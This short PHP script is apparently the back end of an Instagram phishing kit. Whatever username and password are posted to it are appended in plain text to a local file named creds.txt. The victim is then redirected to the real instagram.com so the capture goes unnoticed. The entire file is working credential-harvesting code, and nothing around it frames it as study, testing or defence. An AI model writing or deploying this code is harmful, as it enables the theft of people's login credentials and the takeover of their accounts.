<?php

if(isset($_POST['username']) && isset($_POST['password']))
{
    file_put_contents("creds.txt", "Username : ".$_POST['username']." , Password: ".$_POST['password']."\n", FILE_APPEND | LOCK_EX);
    header('Location: https://www.instagram.com');
}
else
    header('Location: login.html');
?>